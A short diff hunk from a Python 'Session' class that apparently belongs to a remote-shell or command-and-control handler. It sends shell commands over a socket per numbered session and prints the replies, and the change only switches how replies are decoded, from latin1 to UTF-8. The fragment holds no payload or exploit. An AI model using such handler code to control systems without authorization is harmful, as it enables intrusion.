@@ -50,7 +50,7 @@ class Session:
                     # self.socket.send(shell.encode())
                     print(self.session_nb)
                     if(CheckConn().safeSend(self.session_nb, self.socket,shell.encode())):
-                        print(recvall(self.socket,4096).decode("latin1"))
+                        print(recvall(self.socket,4096).decode("utf-8","replace"))
                     else:
                         printColor("error","\n[-] An error occurred while sending the command.\n")
                         break
